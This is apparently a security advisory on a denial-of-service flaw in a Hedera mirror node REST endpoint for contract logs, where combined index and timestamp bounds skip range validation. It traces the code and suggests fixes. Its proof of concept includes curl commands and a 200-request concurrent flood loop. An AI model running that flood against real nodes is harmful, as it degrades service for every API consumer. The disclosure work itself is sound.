### Title
Unauthenticated Multi-Union SQL Query DoS via Combined Index and Timestamp Range Bounds in `getContractLogsById`

### Summary
The `getContractLogsById` handler in `rest/controllers/contractController.js` allows any unauthenticated caller to trigger a 3-way UNION SQL query by supplying both `index` range bounds and `timestamp` range bounds. Unlike the sibling `/contracts/results/logs` endpoint, the per-contract path never invokes `optimizeTimestampFilters`, so no timestamp-range width validation is applied. Each of the three generated sub-queries carries its own `LIMIT` and `ORDER BY`, and the outer UNION adds a sort pass, multiplying database work per request with no authentication or rate-limiting gate in the REST layer.

### Finding Description

**Exact code path**

`rest/controllers/contractController.js` → `getContractLogsById` (line 779) → `extractContractLogsMultiUnionQuery(filters, contractId)` (line 802) → `getContractLogsLowerFilters` / `getInnerFilters` / `getUpperFilters` (lines 695–697) → `ContractService.getContractLogsQuery` (line 323 in `rest/service/contractService.js`) → 3-way UNION SQL.

**Root cause**

Inside `extractContractLogsMultiUnionQuery` the branch that calls `optimizeTimestampFilters` (which internally calls `parseTimestampFilters` with `validateRange=true`) is guarded by `contractId === undefined`:

```js
// rest/controllers/contractController.js lines 678-686
} else if (contractId === undefined) {
  // Optimize timestamp filters only when there is no transaction hash and transaction id
  const {filters: timestampFilters, next} = await optimizeTimestampFilters(...);
  ...
}
```

Because `getContractLogsById` always supplies a `contractId`, this branch is never taken. The `maxTimestampRangeNs` guard in `parseTimestampFilters` (lines 1657–1665 of `rest/utils.js`) is therefore never reached for this endpoint.

**Exploit flow**

With the request `GET /contracts/:contractId/results/logs?index=gte:0&index=lte:999999&timestamp=gte:A&timestamp=lte:B` (A ≠ B):

1. `bounds.secondary` gets lower=`index>=0` and upper=`index<=999999`.
2. `bounds.primary` gets lower=`timestamp>=A` and upper=`timestamp<=B`.
3. `validateContractLogsBounds` passes: `validateLowerBounds` requires `primary.lower.operator` to be `gte` (it is); `validateUpperBounds` requires `primary.upper.operator` to be `lte` (it is).
4. `getContractLogsLowerFilters` → `getLowerFilters` returns `[timestamp=A, index>=0]` (non-empty, so returned immediately).
5. `getInnerFilters` returns `[timestamp>A, timestamp<B]`.
6. `getUpperFilters` returns `[timestamp=B, index<=999999]`.
7. `ContractService.getContractLogsQuery` (lines 335–364) sees three non-empty filter arrays and emits:

```sql
(SELECT … WHERE cl.contract_id=$1 AND cl.index>=$4 AND cl.consensus_timestamp=$5
 ORDER BY … LIMIT $3)
UNION
(SELECT … WHERE cl.contract_id=$1 AND cl.consensus_timestamp>$6 AND cl.consensus_timestamp<$7
 ORDER BY … LIMIT $3)
UNION
(SELECT … WHERE cl.contract_id=$1 AND cl.index<=$8 AND cl.consensus_timestamp=$9
 ORDER BY … LIMIT $3)
ORDER BY consensus_timestamp DESC, index DESC
LIMIT $3
```

The inner sub-query has no index bound and spans the full supplied timestamp range. With `A=0` and `B=9999999999999999999` it covers every log row for the contract. Each sub-query carries its own `ORDER BY` + `LIMIT`, and the outer UNION requires a merge sort before the final `LIMIT` is applied — three independent index scans plus a sort pass per request.

**Why existing checks fail**

- `validateContractLogsBounds` only rejects structurally invalid combinations (e.g., `index=eq` without `timestamp=eq`); it does not limit the width of the timestamp range.
- `alterTimestampRange` only collapses `gte:X&lte:X` (same value) into `eq:X`; different values pass through unchanged.
- The `maxTimestampRangeNs` check in `parseTimestampFilters` is never reached for this endpoint.
- The throttle/rate-limit infrastructure found in the codebase (`ThrottleConfiguration`, `ThrottleManagerImpl`) belongs to the `web3` Java module, not the Node.js REST API; no equivalent exists for the REST layer.

### Impact Explanation
An attacker can force 3× the database work per request compared to a plain timestamp-only query. With a wide timestamp range the inner sub-query must traverse the full `contract_log` index range for the target contract before the `LIMIT` can be satisfied. Flooding the endpoint with concurrent requests exhausts the PostgreSQL connection pool and degrades or denies service for all REST API consumers. Because the mirror node REST API serves as the primary data-access layer for Hedera ecosystem tooling, sustained degradation affects a significant fraction of network-dependent applications.

### Likelihood Explanation
No authentication, API key, or session is required. The parameter combination is trivially constructed. The attack is stateless and infinitely repeatable from a single IP or distributed across many. No existing REST-layer rate limiting prevents amplification.

### Recommendation
1. **Apply timestamp range validation unconditionally** in `extractContractLogsMultiUnionQuery` regardless of whether `contractId` is set. Move the `parseTimestampFilters` call with `validateRange=true` outside the `contractId === undefined` branch, or add an explicit range-width check before the UNION query is built.
2. **Add REST-layer rate limiting** (e.g., express-rate-limit or a reverse-proxy rule) on the `/contracts/:contractId/results/logs` endpoint.
3. **Consider capping the number of UNION sub-queries** or refusing the 3-way UNION when the inner timestamp range exceeds a configurable threshold.

### Proof of Concept

```
# Step 1 – resolve any valid contract ID (e.g., from /api/v1/contracts)
CONTRACT=0.0.1234

# Step 2 – send the amplified query (no auth required)
curl -s "https://<mirror-node>/api/v1/contracts/${CONTRACT}/results/logs\
?index=gte:0\
&index=lte:999999\
&timestamp=gte:0\
&timestamp=lte:9999999999999999999"

# Step 3 – flood concurrently to exhaust DB connections
for i in $(seq 1 200); do
  curl -s "https://<mirror-node>/api/v1/contracts/${CONTRACT}/results/logs\
?index=gte:0&index=lte:999999&timestamp=gte:0&timestamp=lte:9999999999999999999" &
done
wait
```

Each request generates the 3-way UNION SQL shown above. Sustained flooding degrades query throughput for all REST API consumers. [1](#0-0) 
<cite repo="oyakh1/hiero-mirror-node--038" path="rest/controllers/contractController.js

### Citations

**File:** rest/controllers/contractController.js (L779-812)
```javascript
  getContractLogsById = async (req, res) => {
    // get sql filter query, params, limit and limit query from query filters
    let {filters, contractId: contractIdParam} = extractContractIdAndFiltersFromValidatedRequest(
      req,
      acceptedContractLogsByIdParameters
    );
    filters = alterTimestampRange(filters);
    checkTimestampsForTopics(filters);

    const contractId = await ContractService.computeContractIdFromString(contractIdParam);

    // workaround for conflict with /contracts/:contractId/results/:consensusTimestamp API
    res.locals[requestPathLabel] = `${req.baseUrl}${req.route.path}`;
    if (!contractId) {
      res.locals[responseDataLabel] = {
        logs: [],
        links: {
          next: null,
        },
      };
      return;
    }

    const query = await this.extractContractLogsMultiUnionQuery(filters, contractId);
    const rows = await ContractService.getContractLogs(query);
    const logs = rows.map((row) => new ContractLogViewModel(row));

    res.locals[responseDataLabel] = {
      logs,
      links: {
        next: this.getPaginationLink(req, logs, query.bounds, query.limit, query.order),
      },
    };
  };
```
